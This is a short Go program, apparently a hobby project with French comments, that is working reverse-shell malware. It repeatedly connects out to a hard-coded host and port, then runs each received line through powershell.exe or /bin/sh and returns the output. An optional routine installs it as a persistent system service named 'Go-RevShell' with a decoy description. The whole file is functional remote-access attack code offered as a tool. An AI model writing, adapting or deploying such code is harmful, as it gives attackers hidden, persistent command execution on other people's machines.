package main

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/takama/daemon"
)

// To-Do :
// - afficher prompt

func main() {
	// daemonize()
	connectToClient("192.168.1.24", 1111)
}

func daemonize() {
	service, err := daemon.New("Go-RevShell", "Une tortue sur son dos", daemon.SystemDaemon)
	handleError(err)
	_, err = service.Install()
	handleError(err)
}

func connectToClient(host string, port int) {
	connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
	if err != nil {
		time.Sleep(2 * time.Second)
		connectToClient(host, port)
	} else {
		connexion.Write([]byte("[+] Connected to target.\n"))
		var shell string
		if runtime.GOOS == "windows" {
			shell = "powershell.exe"
		} else {
			shell = "/bin/sh"
		}
		reverseShell(connexion, shell)
	}
}

func reverseShell(connexion net.Conn, shell string) {
	for {
		clientEntry, err := bufio.NewReader(connexion).ReadString('\n')
		handleError(err)
		cmdOutput, err := exec.Command(shell, strings.TrimSuffix(clientEntry, "\n")).Output()
		if err != nil {
			connexion.Write([]byte("[-] Unknown command.\n"))
		}
		_, err = connexion.Write(cmdOutput)
		connexion.Write([]byte("[+] Command sent.\n"))
		handleError(err)
	}
}

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
